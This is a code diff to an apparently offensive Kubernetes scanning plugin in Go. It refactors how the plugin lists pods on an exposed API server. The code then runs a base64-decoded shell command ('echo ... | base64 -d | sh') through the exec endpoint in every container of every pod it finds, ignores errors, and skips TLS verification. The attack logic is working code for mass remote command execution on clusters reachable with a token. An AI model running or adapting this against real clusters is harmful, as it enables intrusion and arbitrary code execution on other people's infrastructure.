@@ -2,45 +2,40 @@ package plugins
 
 import (
 	"bytes"
-	"context"
 	"encoding/base64"
 	"fmt"
 	"log"
+	"net/url"
 	"strings"
-	"time"
 
 	"github.com/404tk/lazyscan/common"
-
-	v1 "k8s.io/api/core/v1"
-	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
-	"k8s.io/client-go/kubernetes"
-	"k8s.io/client-go/kubernetes/scheme"
+	"github.com/404tk/lazyscan/pkg/schema"
+	"github.com/tidwall/gjson"
 	"k8s.io/client-go/rest"
 	"k8s.io/client-go/tools/remotecommand"
 )
 
 type KubeAPIConfig struct {
-	Command   string
-	Clientset *kubernetes.Clientset
-	Config    *rest.Config
+	Command string
+	Config  *rest.Config
 }
 
 func KubeAPIServerScan(info *common.HostInfo) (bool, error) {
 	config := getConfig(info.Host, info.Port, info.Token)
 
-	// create the clientset
-	clientset, err := kubernetes.NewForConfig(config)
-	if err != nil {
+	opts := schema.K8sRequestOption{
+		Token:    info.Token,
+		Endpoint: fmt.Sprintf("https://%s:%s", info.Host, info.Port),
+		Api:      "/api/v1/pods",
+		Method:   "GET",
+	}
+	resp, err := schema.ServerAccountRequest(opts)
+	if err != nil || !strings.Contains(resp, "items") {
 		return false, err
 	}
-	// list pods
-	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(info.Timeout)*time.Second)
-	defer cancel()
-	pods, err := clientset.CoreV1().Pods("").List(ctx, metav1.ListOptions{})
-	if err != nil {
-		return false, err
-	}
-	result := fmt.Sprintf("[%s:%s] There are %d pods in the cluster.", info.Host, info.Port, len(pods.Items))
+	pods := gjson.Get(resp, "items").Array()
+	result := fmt.Sprintf("[%s:%s] There are %d pods in the cluster.",
+		info.Host, info.Port, len(pods))
 	log.Println(result)
 	if info.Queue != nil {
 		vuln := common.Vuln{
@@ -61,35 +56,28 @@ func KubeAPIServerScan(info *common.HostInfo) (bool, error) {
 		b64 := base64.StdEncoding.EncodeToString([]byte(cmd))
 
 		var kubeconf = &KubeAPIConfig{
-			Command:   fmt.Sprintf("echo %s | base64 -d | sh", b64),
-			Clientset: clientset,
-			Config:    config,
+			Command: fmt.Sprintf("echo %s | base64 -d | sh", b64),
+			Config:  config,
 		}
-		for _, p := range pods.Items {
-			for _, c := range p.Spec.Containers {
+		for _, p := range pods {
+			pn := p.Get("metadata.name").String()
+			ns := p.Get("metadata.namespace").String()
+			for _, c := range p.Get("spec.containers").Array() {
 				// 批量pods执行时忽略报错
-				kubeconf.kubeAPIExec(p.Name, p.Namespace, c.Name)
+				api := fmt.Sprintf(opts.Endpoint+
+					"/api/v1/namespaces/%s/pods/%s/exec"+
+					"?container=%s&command=%2Fbin%2Fsh&command=-c&command=%s&stderr=true&stdin=true&stdout=true",
+					ns, pn, c.Get("name").String(), url.QueryEscape(cmd))
+				kubeconf.kubeAPIExec(pn, ns, c.Get("name").String(), api)
 			}
 		}
 	}
 	return true, err
 }
 
-func (conf *KubeAPIConfig) kubeAPIExec(podName, namespace, container string) {
-	req := conf.Clientset.CoreV1().RESTClient().Post().
-		Resource("pods").
-		Name(podName).
-		Namespace(namespace).
-		SubResource("exec").
-		Param("container", container).
-		VersionedParams(&v1.PodExecOptions{
-			Command: []string{"/bin/sh", "-c", conf.Command},
-			Stdin:   true,
-			Stdout:  true,
-			Stderr:  true,
-			TTY:     false,
-		}, scheme.ParameterCodec)
-	executor, err := remotecommand.NewSPDYExecutor(conf.Config, "POST", req.URL())
+func (conf *KubeAPIConfig) kubeAPIExec(podName, namespace, container, api string) {
+	u, err := url.ParseRequestURI(api)
+	executor, err := remotecommand.NewSPDYExecutor(conf.Config, "POST", u)
 	if err != nil {
 		return
 	}
@@ -104,9 +92,8 @@ func (conf *KubeAPIConfig) kubeAPIExec(podName, namespace, container string) {
 
 func getConfig(ip, port, token string) *rest.Config {
 	return &rest.Config{
-		Host:            fmt.Sprintf("https://%s:%s/", ip, port),
-		BearerToken:     token,
-		BearerTokenFile: "",
+		Host:        fmt.Sprintf("https://%s:%s/", ip, port),
+		BearerToken: token,
 		TLSClientConfig: rest.TLSClientConfig{
 			Insecure: true, // 设置为true时 不需要CA
 			// CAData: []byte(ca_crt),
